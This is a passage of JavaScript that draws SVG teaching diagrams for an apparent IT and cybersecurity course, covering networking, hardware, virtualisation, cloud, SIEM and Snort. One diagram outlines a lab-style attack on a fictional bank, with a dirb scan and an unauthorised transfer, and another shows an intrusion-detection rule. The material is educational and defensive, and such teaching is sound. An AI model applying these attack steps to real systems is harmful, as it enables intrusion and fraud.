      <text x="55" y="54" font-size="10">PC1</text>
      <line class="thin" x1="105" y1="95" x2="105" y2="135"/>
      <circle cx="105" cy="145" r="12" class="box"/>
      <text x="105" y="149" font-size="10">PC2</text>
      <line class="thin" x1="155" y1="95" x2="155" y2="60"/>
      <circle cx="155" cy="50" r="12" class="box"/>
      <text x="155" y="54" font-size="10">PC3</text>
      <text class="sm" x="110" y="170">Cheapest to install &amp; cable</text>
      <text class="sm" x="110" y="188" font-size="11" fill="#f87171">Cable break halts whole network</text>
    </g>

    <!-- Ring Topology -->
    <g transform="translate(510, 15)">
      <rect class="box" x="0" y="0" width="220" height="200" rx="10"/>
      <text x="110" y="28" font-weight="700" fill="#c084fc">Ring Topology</text>
      <!-- Ring path -->
      <circle cx="110" cy="95" r="42" fill="none" stroke="#c084fc" stroke-width="2" stroke-dasharray="6 3"/>
      <!-- Nodes on ring -->
      <circle cx="110" cy="53" r="12" class="box"/>
      <text x="110" y="57" font-size="10">PC1</text>
      <circle cx="152" cy="95" r="12" class="box"/>
      <text x="152" y="99" font-size="10">PC2</text>
      <circle cx="110" cy="137" r="12" class="box"/>
      <text x="110" y="141" font-size="10">PC3</text>
      <circle cx="68" cy="95" r="12" class="box"/>
      <text x="68" y="99" font-size="10">PC4</text>
      <text class="sm" x="110" y="170">Equal access via token passing</text>
      <text class="sm" x="110" y="188" font-size="11" fill="#f87171">One failed device breaks loop</text>
    </g>`);
}

function osiLayersSVG(){
  return dg("osi", "0 0 740 330", `
    <!-- Header row -->
    <text x="55" y="22" font-weight="700" fill="var(--muted)">Layer</text>
    <text x="135" y="22" font-weight="700" fill="var(--muted)">Name</text>
    <text x="215" y="22" font-weight="700" fill="var(--muted)">PDU</text>
    <text class="left" x="275" y="22" font-weight="700" fill="var(--muted)">Protocols &amp; Concepts</text>
    <text x="665" y="22" font-weight="700" fill="var(--muted)">Device / Role</text>

    <!-- Layer 7 -->
    <rect class="box" x="20" y="32" width="700" height="36" rx="6" fill="#1e293b"/>
    <rect x="25" y="36" width="60" height="28" rx="4" fill="#ef4444"/>
    <text x="55" y="55" fill="#fff" font-weight="800">L7</text>
    <text x="135" y="55" font-weight="700" fill="#fca5a5">Application</text>
    <text class="sm" x="215" y="55">Data</text>
    <text class="sm left" x="275" y="55">HTTP, HTTPS, DNS, FTP, SSH, SMTP</text>
    <text class="sm" x="665" y="55">Browser / App</text>

    <!-- Layer 6 -->
    <rect class="box" x="20" y="73" width="700" height="36" rx="6"/>
    <rect x="25" y="77" width="60" height="28" rx="4" fill="#f97316"/>
    <text x="55" y="96" fill="#fff" font-weight="800">L6</text>
    <text x="135" y="96" font-weight="700" fill="#fdba74">Presentation</text>
    <text class="sm" x="215" y="96">Data</text>
    <text class="sm left" x="275" y="96">SSL/TLS, ASCII, JPEG, Encryption</text>
    <text class="sm" x="665" y="96">Translator</text>

    <!-- Layer 5 -->
    <rect class="box" x="20" y="114" width="700" height="36" rx="6"/>
    <rect x="25" y="118" width="60" height="28" rx="4" fill="#eab308"/>
    <text x="55" y="137" fill="#000" font-weight="800">L5</text>
    <text x="135" y="137" font-weight="700" fill="#fde047">Session</text>
    <text class="sm" x="215" y="137">Data</text>
    <text class="sm left" x="275" y="137">NetBIOS, RPC, Sockets, Session State</text>
    <text class="sm" x="665" y="137">Session Mgr</text>

    <!-- Layer 4 -->
    <rect class="box" x="20" y="155" width="700" height="36" rx="6"/>
    <rect x="25" y="159" width="60" height="28" rx="4" fill="#22c55e"/>
    <text x="55" y="178" fill="#fff" font-weight="800">L4</text>
    <text x="135" y="178" font-weight="700" fill="#86efac">Transport</text>
    <text class="sm" x="215" y="178">Segment</text>
    <text class="sm left" x="275" y="178">TCP (Reliable, Ports), UDP (Stateless)</text>
    <text class="sm" x="665" y="178">Firewall L4</text>

    <!-- Layer 3 -->
    <rect class="box" x="20" y="196" width="700" height="36" rx="6"/>
    <rect x="25" y="200" width="60" height="28" rx="4" fill="#06b6d4"/>
    <text x="55" y="219" fill="#fff" font-weight="800">L3</text>
    <text x="135" y="219" font-weight="700" fill="#67e8f9">Network</text>
    <text class="sm" x="215" y="219">Packet</text>
    <text class="sm left" x="275" y="219">IP (IPv4/IPv6), ICMP (Ping), Routing</text>
    <text class="sm" x="665" y="219">Router</text>

    <!-- Layer 2 -->
    <rect class="box" x="20" y="237" width="700" height="36" rx="6"/>
    <rect x="25" y="241" width="60" height="28" rx="4" fill="#3b82f6"/>
    <text x="55" y="260" fill="#fff" font-weight="800">L2</text>
    <text x="135" y="260" font-weight="700" fill="#93c5fd">Data Link</text>
    <text class="sm" x="215" y="260">Frame</text>
    <text class="sm left" x="275" y="260">Ethernet, MAC Addresses, ARP, Frames</text>
    <text class="sm" x="665" y="260">Switch / NIC</text>

    <!-- Layer 1 -->
    <rect class="box" x="20" y="278" width="700" height="36" rx="6"/>
    <rect x="25" y="282" width="60" height="28" rx="4" fill="#a855f7"/>
    <text x="55" y="301" fill="#fff" font-weight="800">L1</text>
    <text x="135" y="301" font-weight="700" fill="#d8b4fe">Physical</text>
    <text class="sm" x="215" y="301">Bits</text>
    <text class="sm left" x="275" y="301">Binary Signals (0s &amp; 1s), Cables, Radio</text>
    <text class="sm" x="665" y="301">Hub / Cable</text>`);
}

function tcpHandshakeSVG(){
  return dg("tcphs", "0 0 740 250", `
    <!-- Alice -->
    <g transform="translate(140, 20)">
      <circle cx="0" cy="15" r="20" class="box acc"/>
      <text x="0" y="20" font-weight="700">Alice</text>
      <text class="sm" x="0" y="48">Client</text>
      <line class="thin" x1="0" y1="58" x2="0" y2="220"/>
    </g>

    <!-- Bob -->
    <g transform="translate(600, 20)">
      <circle cx="0" cy="15" r="20" class="box"/>
      <text x="0" y="20" font-weight="700">Bob</text>
      <text class="sm" x="0" y="48">Server</text>
      <line class="thin" x1="0" y1="58" x2="0" y2="220"/>
    </g>

    <!-- Step 1: SYN -->
    <line class="arr" x1="140" y1="90" x2="595" y2="115" marker-end="url(#ah-tcphs)"/>
    <rect x="270" y="82" width="200" height="26" rx="6" fill="#1e293b" stroke="#38bdf8"/>
    <text x="370" y="100" fill="#38bdf8" font-size="12" font-weight="700">1. SYN [Seq = 0]</text>

    <!-- Step 2: SYN-ACK -->
    <line class="arr" x1="600" y1="135" x2="145" y2="160" marker-end="url(#ah-tcphs)"/>
    <rect x="250" y="128" width="240" height="26" rx="6" fill="#1e293b" stroke="#22c55e"/>
    <text x="370" y="146" fill="#22c55e" font-size="12" font-weight="700">2. SYN/ACK [Seq = 0, Ack = 1]</text>

    <!-- Step 3: ACK -->
    <line class="arr" x1="140" y1="180" x2="595" y2="205" marker-end="url(#ah-tcphs)"/>
    <rect x="270" y="172" width="200" height="26" rx="6" fill="#1e293b" stroke="#a855f7"/>
    <text x="370" y="190" fill="#c084fc" font-size="12" font-weight="700">3. ACK [Seq = 1, Ack = 1]</text>

    <text class="sm" x="370" y="235" fill="var(--accent)" font-weight="700">🎉 Connection Established: Reliable Bidirectional Stream Active</text>`);
}

function encapsulationFlowSVG(){
  return dg("encap", "0 0 740 220", `
    <!-- Top Level: Application Data -->
    <g transform="translate(15, 20)">
      <text class="sm left" x="0" y="22" fill="#ef4444" font-weight="700">L7 Data:</text>
      <rect class="box" x="245" y="0" width="460" height="34" rx="6"/>
      <text x="475" y="22" font-weight="700">Application Payload (HTTP / Data)</text>
    </g>

    <!-- Layer 4: Segment -->
    <g transform="translate(15, 65)">
      <text class="sm left" x="0" y="22" fill="#22c55e" font-weight="700">L4 Segment:</text>
      <rect class="box acc" x="245" y="0" width="85" height="34" rx="6"/>
      <text x="287" y="22" font-weight="700" fill="var(--accent)" font-size="12">TCP</text>
      <rect class="box" x="330" y="0" width="375" height="34" rx="6"/>
      <text class="sm" x="517" y="22">Application Payload</text>
    </g>

    <!-- Layer 3: Packet -->
    <g transform="translate(15, 110)">
      <text class="sm left" x="0" y="22" fill="#06b6d4" font-weight="700">L3 Packet:</text>
      <rect x="165" y="0" width="80" height="34" rx="6" fill="#083344" stroke="#06b6d4" stroke-width="1.5"/>
      <text x="205" y="22" font-weight="700" fill="#67e8f9" font-size="12">IP Header</text>
      <rect class="box acc" x="245" y="0" width="85" height="34" rx="6"/>
      <text class="sm" x="287" y="22">TCP</text>
      <rect class="box" x="330" y="0" width="375" height="34" rx="6"/>
      <text class="sm" x="517" y="22">Application Payload</text>
    </g>

    <!-- Layer 2: Frame -->
    <g transform="translate(15, 155)">
      <text class="sm left" x="0" y="22" fill="#3b82f6" font-weight="700">L2 Frame:</text>
      <rect x="85" y="0" width="80" height="34" rx="6" fill="#172554" stroke="#3b82f6" stroke-width="1.5"/>
      <text x="125" y="22" font-weight="700" fill="#93c5fd" font-size="12">MAC Header</text>
      <rect x="165" y="0" width="80" height="34" rx="6" fill="#083344" stroke="#06b6d4" stroke-width="1.5"/>
      <text class="sm" x="205" y="22">IP Header</text>
      <rect class="box acc" x="245" y="0" width="85" height="34" rx="6"/>
      <text class="sm" x="287" y="22">TCP</text>
      <rect class="box" x="330" y="0" width="310" height="34" rx="6"/>
      <text class="sm" x="485" y="22">Application Payload</text>
      <rect x="640" y="0" width="65" height="34" rx="6" fill="#312e81" stroke="#818cf8" stroke-width="1.5"/>
      <text x="672" y="22" font-weight="700" fill="#c7d2fe" font-size="12">Trailer</text>
    </g>
    <text class="sm" x="370" y="208">Encapsulation adds headers downwards; Decapsulation strips headers upwards</text>`);
}

function dhcpDoraSVG(){
  return dg("dhcp", "0 0 740 210", `
    <!-- Client -->
    <g transform="translate(120, 15)">
      <rect class="box acc" x="-50" y="0" width="100" height="32" rx="6"/>
      <text x="0" y="21" font-weight="700">New Client</text>
      <line class="thin" x1="0" y1="36" x2="0" y2="185"/>
    </g>

    <!-- Server -->
    <g transform="translate(620, 15)">
      <rect class="box" x="-50" y="0" width="100" height="32" rx="6"/>
      <text x="0" y="21" font-weight="700">DHCP Server</text>
      <line class="thin" x1="0" y1="36" x2="0" y2="185"/>
    </g>

    <!-- D: Discover -->
    <line class="arr" x1="120" y1="60" x2="615" y2="75" marker-end="url(#ah-dhcp)"/>
    <text class="sm" x="370" y="62" fill="#f59e0b" font-weight="700">1. DHCP Discover (Broadcast: "Need an IP!")</text>

    <!-- O: Offer -->
    <line class="arr" x1="620" y1="95" x2="125" y2="110" marker-end="url(#ah-dhcp)"/>
    <text class="sm" x="370" y="97" fill="#38bdf8" font-weight="700">2. DHCP Offer ("How about 192.168.1.10?")</text>

    <!-- R: Request -->
    <line class="arr" x1="120" y1="130" x2="615" y2="145" marker-end="url(#ah-dhcp)"/>
    <text class="sm" x="370" y="132" fill="#a855f7" font-weight="700">3. DHCP Request ("Yes, I accept 192.168.1.10!")</text>

    <!-- A: ACK -->
    <line class="arr" x1="620" y1="165" x2="125" y2="180" marker-end="url(#ah-dhcp)"/>
    <text class="sm" x="370" y="167" fill="#22c55e" font-weight="700">4. DHCP ACK ("Confirmed! Leased for 24 hours.")</text>`);
}

function offensiveWorkflowSVG(){
  return dg("offflow", "0 0 740 120", `
    <!-- Step 1 -->
    <rect class="box" x="15" y="25" width="155" height="70" rx="8"/>
    <text x="92" y="52" font-weight="700" fill="#f87171">1. Reconnaissance</text>
    <text class="sm" x="92" y="72">dirb http://fakebank</text>
    <line class="arr" x1="172" y1="60" x2="198" y2="60" marker-end="url(#ah-offflow)"/>

    <!-- Step 2 -->
    <rect class="box" x="200" y="25" width="155" height="70" rx="8"/>
    <text x="277" y="52" font-weight="700" fill="#f59e0b">2. Discovery</text>
    <text class="sm" x="277" y="72">/bank-transfer endpoint</text>
    <line class="arr" x1="357" y1="60" x2="383" y2="60" marker-end="url(#ah-offflow)"/>

    <!-- Step 3 -->
    <rect class="box" x="385" y="25" width="155" height="70" rx="8"/>
    <text x="462" y="52" font-weight="700" fill="#38bdf8">3. Exploitation</text>
    <text class="sm" x="462" y="72">Credit Acct 1245-8811</text>
    <line class="arr" x1="542" y1="60" x2="568" y2="60" marker-end="url(#ah-offflow)"/>

    <!-- Step 4 -->
    <rect class="box acc" x="570" y="25" width="155" height="70" rx="8"/>
    <text x="647" y="52" font-weight="700" fill="var(--accent)">4. Objective Met</text>
    <text class="sm" x="647" y="72">Flag: BANK-HACKED</text>`);
}

function defensivePillarsSVG(){
  return dg("defpil", "0 0 740 140", `
    <!-- SOC -->
    <rect class="box" x="15" y="15" width="165" height="110" rx="8"/>
    <text x="97" y="42" font-weight="700" fill="#38bdf8">🔵 SOC Operations</text>
    <text class="sm" x="97" y="65">Continuous Monitoring</text>
    <text class="sm" x="97" y="85">SIEM Logs &amp; Alarms</text>
    <text class="sm" x="97" y="105">Triage &amp; Escalation</text>

    <!-- DFIR -->
    <rect class="box" x="195" y="15" width="165" height="110" rx="8"/>
    <text x="277" y="42" font-weight="700" fill="#eab308">🔍 DFIR</text>
    <text class="sm" x="277" y="65">Digital Forensics</text>
    <text class="sm" x="277" y="85">Incident Containment</text>
    <text class="sm" x="277" y="105">Root Cause Analysis</text>

    <!-- Malware Analysis -->
    <rect class="box" x="375" y="15" width="165" height="110" rx="8"/>
    <text x="457" y="42" font-weight="700" fill="#ec4899">🧪 Malware Analysis</text>
    <text class="sm" x="457" y="65">Reverse Engineering</text>
    <text class="sm" x="457" y="85">Sandbox Detonation</text>
    <text class="sm" x="457" y="105">Signature Extraction</text>

    <!-- Threat Intel -->
    <rect class="box" x="555" y="15" width="165" height="110" rx="8"/>
    <text x="637" y="42" font-weight="700" fill="#22c55e">🌐 Threat Intel</text>
    <text class="sm" x="637" y="65">Adversary Tactics (TTPs)</text>
    <text class="sm" x="637" y="85">IOC Feeds &amp; CVEs</text>
    <text class="sm" x="637" y="105">Proactive Defense</text>`);
}

function hardwareComponentsSVG(){
  return dg("hwcomp", "0 0 740 220", `
    <!-- Motherboard container -->
    <rect class="box" x="20" y="15" width="700" height="190" rx="10" stroke="#06b6d4" stroke-width="1.5"/>
    <text class="left" x="35" y="38" font-size="12" fill="#06b6d4" font-weight="700">Motherboard (PCB Bus System)</text>

    <!-- CPU -->
    <rect class="box acc" x="50" y="55" width="130" height="110" rx="8"/>
    <text x="115" y="90" font-weight="700" fill="var(--accent)">CPU (Processor)</text>
    <text class="sm" x="115" y="112">System Brain</text>
    <text class="sm" x="115" y="132">Executes instructions</text>
    <text class="sm" x="115" y="150" fill="var(--accent)">ALU + Registers + Cache</text>

    <!-- RAM -->
    <rect class="box" x="200" y="55" width="115" height="110" rx="8"/>
    <text x="257" y="90" font-weight="700" fill="#38bdf8">RAM (Memory)</text>
    <text class="sm" x="257" y="112">Fast Volatile Store</text>
    <text class="sm" x="257" y="132">Wiped on power off</text>
    <text class="sm" x="257" y="150" fill="#38bdf8">GBs of active state</text>

    <!-- Storage -->
    <rect class="box" x="335" y="55" width="125" height="110" rx="8"/>
    <text x="397" y="90" font-weight="700" fill="#f59e0b">Storage (SSD/HDD)</text>
    <text class="sm" x="397" y="112">Non-Volatile Store</text>
    <text class="sm" x="397" y="132">Holds OS &amp; User Files</text>
    <text class="sm" x="397" y="150" fill="#f59e0b">SATA / NVMe Bus</text>

    <!-- GPU -->
    <rect class="box" x="480" y="55" width="110" height="110" rx="8"/>
    <text x="535" y="90" font-weight="700" fill="#c084fc">GPU (Graphics)</text>
    <text class="sm" x="535" y="112">PCIe Expansion</text>
    <text class="sm" x="535" y="132">Massive Parallelism</text>
    <text class="sm" x="535" y="150" fill="#c084fc">Display &amp; Compute</text>

    <!-- PSU -->
    <rect class="box" x="610" y="55" width="95" height="110" rx="8"/>
    <text x="657" y="90" font-weight="700" fill="#ef4444">PSU</text>
    <text class="sm" x="657" y="112">Power Supply</text>
    <text class="sm" x="657" y="132">AC &rarr; DC Lines</text>
    <text class="sm" x="657" y="150" fill="#ef4444">12V / 5V / 3.3V</text>`);
}

function bootSequenceSVG(){
  return dg("bootseq", "0 0 740 110", `
    <!-- Step 1 -->
    <rect class="box" x="15" y="20" width="105" height="65" rx="6"/>
    <text x="67" y="47" font-weight="700">1. Power On</text>
    <text class="sm" x="67" y="67">PSU stabilizes</text>
    <line class="arr" x1="122" y1="52" x2="138" y2="52" marker-end="url(#ah-bootseq)"/>

    <!-- Step 2 -->
    <rect class="box" x="140" y="20" width="105" height="65" rx="6"/>
    <text x="192" y="47" font-weight="700" fill="#38bdf8">2. BIOS/UEFI</text>
    <text class="sm" x="192" y="67">Firmware loads</text>
    <line class="arr" x1="247" y1="52" x2="263" y2="52" marker-end="url(#ah-bootseq)"/>

    <!-- Step 3 -->
    <rect class="box" x="265" y="20" width="105" height="65" rx="6"/>
    <text x="317" y="47" font-weight="700" fill="#f59e0b">3. POST</text>
    <text class="sm" x="317" y="67">Hardware check</text>
    <line class="arr" x1="372" y1="52" x2="388" y2="52" marker-end="url(#ah-bootseq)"/>

    <!-- Step 4 -->
    <rect class="box" x="390" y="20" width="105" height="65" rx="6"/>
    <text x="442" y="47" font-weight="700" fill="#a855f7">4. Boot Device</text>
    <text class="sm" x="442" y="67">NVMe / SSD chosen</text>
    <line class="arr" x1="497" y1="52" x2="513" y2="52" marker-end="url(#ah-bootseq)"/>

    <!-- Step 5 -->
    <rect class="box" x="515" y="20" width="100" height="65" rx="6"/>
    <text x="565" y="47" font-weight="700" fill="#ec4899">5. Bootloader</text>
    <text class="sm" x="565" y="67">GRUB / WinLoad</text>
    <line class="arr" x1="617" y1="52" x2="633" y2="52" marker-end="url(#ah-bootseq)"/>

    <!-- Step 6 -->
    <rect class="box acc" x="635" y="20" width="95" height="65" rx="6"/>
    <text x="682" y="47" font-weight="700" fill="var(--accent)">6. OS Kernel</text>
    <text class="sm" x="682" y="67">Drivers &amp; GUI</text>`);
}

function hypervisorTypesSVG(){
  return dg("hypv", "0 0 740 220", `
    <!-- Type 1: Bare Metal -->
    <g transform="translate(15, 15)">
      <rect class="box" x="0" y="0" width="220" height="190" rx="8"/>
      <text x="110" y="26" font-weight="700" fill="var(--accent)">Type 1: Bare-Metal</text>
      <rect class="box acc" x="20" y="40" width="180" height="30" rx="4"/>
      <text x="110" y="60" font-weight="700" font-size="11">App 1 | App 2 | App 3</text>
      <rect class="box" x="20" y="75" width="180" height="30" rx="4"/>
      <text x="110" y="95" font-size="11">Guest OS (VMs)</text>
      <rect x="20" y="110" width="180" height="32" rx="4" fill="#14532d" stroke="var(--accent)"/>
      <text x="110" y="130" fill="var(--accent)" font-weight="700" font-size="11">Hypervisor (ESXi, Proxmox)</text>
      <rect class="box" x="20" y="148" width="180" height="30" rx="4"/>
      <text x="110" y="168" font-size="11">Physical Hardware</text>
    </g>

    <!-- Type 2: Hosted -->
    <g transform="translate(260, 15)">
      <rect class="box" x="0" y="0" width="220" height="190" rx="8"/>
      <text x="110" y="26" font-weight="700" fill="#38bdf8">Type 2: Hosted</text>
      <rect class="box acc" x="20" y="40" width="180" height="26" rx="4"/>
      <text x="110" y="57" font-weight="700" font-size="11">Study Lab VMs &amp; Apps</text>
      <rect class="box" x="20" y="70" width="180" height="26" rx="4"/>
      <text x="110" y="87" font-size="11">Guest Operating System</text>
      <rect x="20" y="100" width="180" height="26" rx="4" fill="#0c4a6e" stroke="#38bdf8"/>
      <text x="110" y="117" fill="#38bdf8" font-weight="700" font-size="11">Hypervisor (VirtualBox, VMware)</text>
      <rect class="box" x="20" y="130" width="180" height="26" rx="4"/>
      <text x="110" y="147" font-size="10">Host OS (Win / Mac / Linux)</text>
      <rect class="box" x="20" y="160" width="180" height="22" rx="4"/>
      <text x="110" y="175" font-size="10">Physical Hardware</text>
    </g>

    <!-- Containers -->
    <g transform="translate(505, 15)">
      <rect class="box" x="0" y="0" width="220" height="190" rx="8"/>
      <text x="110" y="26" font-weight="700" fill="#c084fc">Containers (Docker)</text>
      <rect class="box acc" x="20" y="40" width="180" height="35" rx="4"/>
      <text x="110" y="58" font-weight="700" font-size="11">App A + Bins | App B + Bins</text>
      <text class="sm" x="110" y="70">(No Guest OS Overhead!)</text>
      <rect x="20" y="85" width="180" height="30" rx="4" fill="#581c87" stroke="#c084fc"/>
      <text x="110" y="105" fill="#c084fc" font-weight="700" font-size="11">Container Engine (Docker)</text>
      <rect class="box" x="20" y="122" width="180" height="30" rx="4"/>
      <text x="110" y="142" font-size="11">Shared Host OS &amp; Kernel</text>
      <rect class="box" x="20" y="156" width="180" height="24" rx="4"/>
      <text x="110" y="172" font-size="10">Physical Hardware</text>
    </g>`);
}

function osArchitectureSVG(){
  return dg("osarch", "0 0 740 210", `
    <!-- User Space -->
    <rect class="box" x="30" y="15" width="680" height="55" rx="8"/>
    <text x="370" y="38" font-weight="700" fill="#38bdf8">User Space (Restricted Privileges)</text>
    <text class="sm" x="370" y="58">GUI Shell, Terminal Applications, Browsers, Services, User Home Folders</text>

    <!-- System Call Interface -->
    <rect x="100" y="80" width="540" height="28" rx="6" fill="#1e293b" stroke="#eab308" stroke-dasharray="4 3"/>
    <text x="370" y="98" fill="#fde047" font-weight="700" font-size="11">&uarr;&darr; System Call Interface (sys_read, sys_write, sys_fork, sys_exec) &uarr;&darr;</text>

    <!-- Kernel Space -->
    <rect class="box acc" x="30" y="118" width="680" height="55" rx="8"/>
    <text x="370" y="140" font-weight="700" fill="var(--accent)">Kernel Space (Unrestricted Ring 0 Hardware Access)</text>
    <text class="sm" x="370" y="160">Process Scheduler, Virtual Memory Manager, VFS File System, Device Drivers</text>

    <!-- Physical Hardware -->
    <line class="thin" x1="150" y1="183" x2="590" y2="183"/>
    <text class="sm" x="370" y="200" fill="var(--muted)">Underlying Physical Hardware: CPU, RAM, NVMe/SSD, NIC, GPU</text>`);
}

function linuxFileTreeSVG(){
  return dg("linfs", "0 0 740 170", `
    <!-- Root -->
    <rect class="box acc" x="20" y="65" width="70" height="40" rx="6"/>
    <text x="55" y="90" font-weight="800" font-size="16">/ (root)</text>

    <!-- Branches -->
    <line class="thin" x1="90" y1="85" x2="140" y2="85"/>
    <line class="thin" x1="140" y1="25" x2="140" y2="145"/>

    <!-- /home -->
    <line class="thin" x1="140" y1="25" x2="175" y2="25"/>
    <rect class="box" x="175" y="10" width="145" height="32" rx="4"/>
    <text x="247" y="31" font-weight="700" fill="#38bdf8">/home/ubuntu</text>
    <line class="thin" x1="320" y1="26" x2="350" y2="26"/>
    <text class="sm left" x="355" y="30">User files &amp; mission_brief.txt</text>

    <!-- /etc -->
    <line class="thin" x1="140" y1="65" x2="175" y2="65"/>
    <rect class="box" x="175" y="50" width="145" height="32" rx="4"/>
    <text x="247" y="71" font-weight="700" fill="#f59e0b">/etc</text>
    <line class="thin" x1="320" y1="66" x2="350" y2="66"/>
    <text class="sm left" x="355" y="70">System configs (passwd, network, ssh)</text>

    <!-- /var/log -->
    <line class="thin" x1="140" y1="105" x2="175" y2="105"/>
    <rect class="box" x="175" y="90" width="145" height="32" rx="4"/>
    <text x="247" y="111" font-weight="700" fill="#ec4899">/var/log</text>
    <line class="thin" x1="320" y1="106" x2="350" y2="106"/>
    <text class="sm left" x="355" y="110">System logs &amp; authentication audits</text>

    <!-- /bin & /sbin -->
    <line class="thin" x1="140" y1="145" x2="175" y2="145"/>
    <rect class="box" x="175" y="130" width="145" height="32" rx="4"/>
    <text x="247" y="151" font-weight="700" fill="var(--accent)">/bin &amp; /usr/bin</text>
    <line class="thin" x1="320" y1="146" x2="350" y2="146"/>
    <text class="sm left" x="355" y="150">Executables (ls, cat, ping, whoami, find)</text>`);
}

function clientServerPizzaSVG(){
  return dg("cspizza", "0 0 740 200", `
    <!-- Client (Alice) -->
    <rect class="box" x="20" y="25" width="180" height="150" rx="10"/>
    <text class="em" x="110" y="65">👩‍💻</text>
    <text x="110" y="95" font-weight="700" fill="#38bdf8">Client (Alice)</text>
    <text class="sm" x="110" y="118">Web Browser / Smartphone</text>
    <text class="sm" x="110" y="138" fill="var(--muted)">Apartment 80 (Client Port)</text>
    <text class="sm" x="110" y="156">Initiates Request</text>

    <!-- Request Arrow -->
    <line class="arr" x1="210" y1="70" x2="520" y2="70" marker-end="url(#ah-cspizza)"/>
    <text x="365" y="55" font-weight="700" fill="var(--accent)" font-size="12">1. Request (Order Pizza: GET /menu)</text>
    <text class="sm" x="365" y="88">Destination: 192.168.1.100 : Port 80/443</text>

    <!-- Response Arrow -->
    <line class="arr" x1="520" y1="125" x2="210" y2="125" marker-end="url(#ah-cspizza)"/>
    <text x="365" y="115" font-weight="700" fill="#22c55e" font-size="12">2. Response (Pizza Delivered: 200 OK + HTML)</text>
    <text class="sm" x="365" y="145">Returned via Destination Port &amp; Protocol</text>

    <!-- Server (Luigi's Pizza) -->
    <rect class="box acc" x="530" y="25" width="190" height="150" rx="10"/>
    <text class="em" x="625" y="65">🍕🖥️</text>
    <text x="625" y="95" font-weight="700" fill="var(--accent)">Server (Luigi's Pizza)</text>
    <text class="sm" x="625" y="118">IP: 192.168.1.100</text>
    <text class="sm" x="625" y="138" fill="var(--accent)">Port: 80 / 443 (HTTP/S)</text>
    <text class="sm" x="625" y="156">Listens &amp; Serves Data</text>`);
}

function cloudModelsSVG(){
  return dg("cldmod", "0 0 740 220", `
    <!-- IaaS -->
    <g transform="translate(15, 15)">
      <rect class="box" x="0" y="0" width="220" height="190" rx="8"/>
      <text x="110" y="28" font-weight="700" fill="#38bdf8">IaaS (Infrastructure)</text>
      <text class="sm" x="110" y="46">"Unfurnished Apartment"</text>
      <rect class="box acc" x="15" y="60" width="190" height="24" rx="4"/>
      <text x="110" y="76" font-size="10" font-weight="700">You Manage: Apps, OS, Data</text>
      <rect class="box" x="15" y="90" width="190" height="24" rx="4"/>
      <text x="110" y="106" font-size="10">Configure: Firewalls &amp; Runtime</text>
      <rect x="15" y="122" width="190" height="50" rx="4" fill="#0369a1" stroke="#38bdf8"/>
      <text x="110" y="142" font-size="11" font-weight="700" fill="#fff">Provider: Hardware, Hypervisor</text>
      <text x="110" y="160" font-size="10" fill="#bae6fd">AWS EC2, Azure VMs, Linode</text>
    </g>

    <!-- PaaS -->
    <g transform="translate(260, 15)">
      <rect class="box" x="0" y="0" width="220" height="190" rx="8"/>
      <text x="110" y="28" font-weight="700" fill="var(--accent)">PaaS (Platform)</text>
      <text class="sm" x="110" y="46">"Furnished Apartment"</text>
      <rect class="box acc" x="15" y="60" width="190" height="34" rx="4"/>
      <text x="110" y="76" font-size="11" font-weight="700">You Focus Only on Code &amp; Data</text>
      <text class="sm" x="110" y="89">(No OS patching or hardware)</text>
      <rect x="15" y="102" width="190" height="70" rx="4" fill="#15803d" stroke="var(--accent)"/>
      <text x="110" y="124" font-size="11" font-weight="700" fill="#fff">Provider: OS, Runtime, Scaling</text>
      <text x="110" y="142" font-size="10" fill="#bbf7d0">Auto Load Balancing &amp; Storage</text>
      <text x="110" y="160" font-size="10" fill="#bbf7d0">Heroku, AWS Elastic Beanstalk</text>
    </g>

    <!-- SaaS -->
    <g transform="translate(505, 15)">
      <rect class="box" x="0" y="0" width="220" height="190" rx="8"/>
      <text x="110" y="28" font-weight="700" fill="#f59e0b">SaaS (Software)</text>
      <text class="sm" x="110" y="46">"Full-Service Hotel Room"</text>
      <rect class="box acc" x="15" y="60" width="190" height="24" rx="4"/>
      <text x="110" y="76" font-size="10" font-weight="700">You Simply Consume Service</text>
      <rect x="15" y="92" width="190" height="80" rx="4" fill="#b45309" stroke="#f59e0b"/>
      <text x="110" y="115" font-size="11" font-weight="700" fill="#fff">Provider Manages Everything:</text>
      <text x="110" y="133" font-size="10" fill="#fef3c7">App, OS, DB, Servers, Security</text>
      <text x="110" y="153" font-size="10" fill="#fef3c7">Google Workspace, Microsoft 365</text>
    </g>`);
}


function siemPipelineSVG(){
  return dg("siem", "0 0 760 170", `
    <g transform="translate(10, 20)">
      <rect class="box" x="0" y="25" width="150" height="90" rx="8"/>
      <text x="75" y="55" font-weight="700">Log Sources</text>
      <text class="sm" x="75" y="75">Firewalls, Windows</text>
      <text class="sm" x="75" y="95">Linux, Cloud, Apps</text>
    </g>

    <line class="arr" x1="165" y1="90" x2="195" y2="90" marker-end="url(#ah-siem)"/>

    <g transform="translate(200, 20)">
      <rect class="box" x="0" y="25" width="150" height="90" rx="8"/>
      <text x="75" y="55" font-weight="700">Forwarders</text>
      <text class="sm" x="75" y="75">Syslog / Beats</text>
      <text class="sm" x="75" y="95">Collection Agents</text>
    </g>

    <line class="arr" x1="355" y1="90" x2="385" y2="90" marker-end="url(#ah-siem)"/>

    <g transform="translate(390, 20)">
      <rect class="box acc" x="0" y="15" width="170" height="110" rx="8"/>
      <text x="85" y="45" font-weight="700">SIEM Core Engine</text>
      <text class="sm" x="85" y="65">Normalization (ECS)</text>
      <text class="sm" x="85" y="85">Correlation Rules</text>
      <text class="sm" x="85" y="105">Threat Intelligence</text>
    </g>

    <line class="arr" x1="565" y1="90" x2="595" y2="90" marker-end="url(#ah-siem)"/>

    <g transform="translate(600, 20)">
      <rect class="box" x="0" y="25" width="150" height="90" rx="8"/>
      <text x="75" y="55" font-weight="700">SOC Operations</text>
      <text class="sm" x="75" y="75">Analyst Dashboards</text>
      <text class="sm" x="75" y="95">Alerts &amp; SOAR</text>
    </g>`);
}

function snortRuleSVG(){
  return dg("snort", "0 0 760 170", `
    <!-- Rule Header -->
    <rect class="box acc" x="20" y="25" width="340" height="60" rx="6"/>
    <text x="190" y="50" font-weight="700" fill="var(--accent)">RULE HEADER (Network Scope)</text>
    <text x="190" y="70" font-family="monospace" font-size="11">alert tcp $EXTERNAL_NET any -> $HOME_NET 21</text>

    <!-- Rule Options -->
    <rect class="box" x="380" y="25" width="360" height="60" rx="6"/>
    <text x="560" y="50" font-weight="700" fill="#38bdf8">RULE OPTIONS (Payload Inspection)</text>
    <text x="560" y="70" font-family="monospace" font-size="11">(msg:"ET FTP root"; content:"USER root"; sid:1;)</text>

    <!-- Details Breakdown -->
